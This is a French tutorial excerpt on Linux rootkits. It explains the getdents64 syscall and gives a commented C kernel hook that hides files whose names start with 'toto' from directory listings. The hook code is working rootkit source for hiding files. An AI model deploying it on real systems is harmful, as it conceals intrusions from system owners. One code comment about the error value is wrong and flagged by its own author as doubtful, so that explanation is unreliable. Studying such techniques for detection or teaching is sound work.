# Cacher des répertoires

Voici le retour de `strace` lors de l'exécution de la commande `ls` :
  
```C
...
openat(AT_FDCWD, ".", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3
fstat(3, {st_mode=S_IFDIR|0775, st_size=4096, ...}) = 0
getdents64(3, 0x58b230347ce0 /* 3 entries */, 32768) = 80
getdents64(3, 0x58b230347ce0 /* 0 entries */, 32768) = 0
close(3)                                = 0
...
```
  
Le syscall `getdents()` lit plusieurs structures `linux_dirent64` depuis le répertoire indiqué par descripteur de fichiers ouvert `fd` et place le résultat dans le buffer pointé par `dirp`. Le retour de ce syscall représente le nombre d'octets écrits (taille de la structure `linux_dirent64` multiplié par le nombre de fichiers) :

```C
long syscall(SYS_getdents, unsigned int fd, struct linux_dirent *dirp, unsigned int count);
```
  
Un hook du syscall `getdents` serait alors intéressant afin de dire au kernel qu'il ne faut pas lire, par exemple, tous les fichiers commençant par *toto* (`(linux_dirent64*)file->d_name`).

Voici le contenu de la structure `linux_dirent64` : 

```C
struct linux_dirent64 {
    u64         d_ino;
    s64         d_off;
    unsigned short      d_reclen;
    unsigned char       d_type;
    char        d_name[];
};
```

Voici un exemple détaillé : 

```C
#include <linux/dirent.h>

#define PREFIX "toto"

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    /* On récupère le pointeur vers la première structure linux_dirent64 (situé dans le registre RSI en userland) que l'on stocke dans la pile en kernelland */
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    /* Il va falloir supprimer des structures et les remplacer dans une liste, par les prochaines.
       On définit alors des pointeurs avant / pendant / après afin de ne pas briser la liste des structures */
    struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
    unsigned long offset = 0;

    /* orig_getdents64 réalise le véritable syscall getdents64 afin de charger RSI, c'est à dire dirent (en userland toujours) 
       le retour de ce syscall représente le nombre d'octets écrits, que l'on passe en paramètres à kzalloc, l'allocateur dynamique du kernel */
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    /* Si erreur du syscall getdents64, on quitte */
    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    long error;
    /* Copie obligatoire de dirent (userland) vers dirent_ker (kerneland) sinon crash */
    error = copy_from_user(dirent_ker, dirent, ret);
    if(error)
        goto done;

    /* Tant que l'on a pas parcouru toutes les structures dirent64 */
    while (offset < ret)
    {
        /* le répertoire courant parcouru est dirent_ker + offset = dirent_ker + (taille de linux_dirent64) * indice */ 
        current_dir = (void *)dirent_ker + offset;
        /* Si le répertoire courant parcouru commence par toto alors on doit le supprimer de la liste */
        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
        {
            /* Dans le cas spécial où il faut supprimer la première structure, on va décrémenter RET et décaler toutes les structures dans la mémoire */
            if( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* Si la structure à cacher n'est pas la première de la liste, alors on fais croire au kernel que l'ancienne structure dirent a une taille de sa propre structure + celle de la suivante c'est à dire celle que l'on veut supprimer */
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            /* Si le répertoire courant parcouru ne commence pas par toto, on continue la boucle */
            previous_dir = current_dir;
        }

        /* offset représente le nombre d'octets écrits. 
           current_dir->d_reclen est donc le nombre d'octets de la structure en cours d'être lue */
        offset += current_dir->d_reclen;
    }

    /* On copie la liste des structures dirent_ker que l'on a générée en ayant supprimé les fichiers commençant par "toto" vers le userland (dirent) */
    error = copy_to_user(dirent, dirent_ker, ret);
    if(error)
        goto done;

    /* S'il y a un soucis, error vaudra 0. Peut etre un probleme ici ???? */
done:
    kfree(dirent_ker);
    return ret;
}
```

Source : [https://xcellerator.github.io/posts/linux_rootkits_06/](https://xcellerator.github.io/posts/linux_rootkits_06/)
